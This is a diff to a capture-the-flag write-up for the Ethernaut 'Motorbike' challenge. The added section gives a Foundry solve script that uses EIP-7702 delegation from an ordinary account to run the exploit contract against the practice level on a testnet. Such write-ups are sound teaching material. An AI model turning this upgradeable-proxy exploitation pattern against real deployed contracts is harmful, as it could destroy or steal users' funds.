@@ -1,7 +1,7 @@
 # Ethernaut Motorbike Solution (After Dencun Upgrade)
 Following the Dencun upgrade, the `selfdestruct` opcode behavior has been modified (EIP-6780). This change means that the selfdestruct no longer removes the contract code from the blockchain, rendering the Motorbike challenge seemingly unsolvable. However, there is a new approach to tackle this, which we will outline in this write-up.
 
-## The solution before the upgrade
+## The solution before the Dencun upgrade
 
 > Ethernaut's motorbike has a brand-new upgradeable engine design.
 >
@@ -84,7 +84,7 @@ function _upgradeToAndCall(address newImplementation, bytes memory data) interna
 }
 ```
 
-## The solution after the upgrade
+## The solution after the Dencun upgrade
 
 The `selfdestruct` function will no longer remove the contract code after the upgrade, so the above solution will not work.
 
@@ -225,3 +225,36 @@ function validateInstance(address payable _instance, address _player) public ove
 * which only has an effect at the end of a transaction.
 ```
 
+## After the Pectra upgrade
+
+The proposed solution involves creating an instance using a contractimplying that only a contract can solve the challenge, not an Externally Owned Account (EOA). Fortunately, after the Pectra upgrade, EIP-7702 allows EOA to set its code based on any existing smart contract. Therefore, we are able to solve the challenge using an EOA. The solve script is as follows:
+
+```solidity
+function run() external {
+    // Deploy delegation contract
+    vm.broadcast(MY_MAIN_PK);
+    implementation = new MotorbikeExploit();
+
+    // MY_MAIN_ADDRESS signs the delegation allowing MY_SEC_ADDRESS to execute transactions on its behalf.
+    Vm.SignedDelegation memory signedDelegation = vm.signDelegation(address(implementation), MY_MAIN_PK);
+
+    // MY_SEC_ADDRESS attaches the signed delegation from MY_MAIN_ADDRESS and broadcasts it.
+    vm.broadcast(MY_SEC_PK);
+    vm.attachDelegation(signedDelegation);
+
+    // As MY_SEC_ADDRESS, execute the transaction via MY_MAIN_ADDRESS's assigned contract.
+    address motorbike = MotorbikeExploit(MY_MAIN_ADDRESS).solve(5047);
+
+    // Submit the instance.
+    vm.broadcast(MY_MAIN_PK);
+    (bool success,) = ethernaut.call(abi.encodeWithSignature("submitLevelInstance(address)", motorbike));
+    require(success, "Failed to submit level instance");
+}
+```
+
+```sh
+forge script script/Exploit.s.sol --rpc-url=$RPC -vvvv --isolate --broadcast --skip-simulation
+```
+
+My successful exploitation tx is [here](https://sepolia.etherscan.io/tx/0x63399238d5bb04bb712ab8b19eaeecfaff587a1ba78ef08e99cb9c1eceb46850).
+The `submitInstance` is called [here](https://sepolia.etherscan.io/tx/0x464173daf7d11fc76ab3669e0bd44cb7b82115c1898aada8f794d45400103b0d#eventlog).
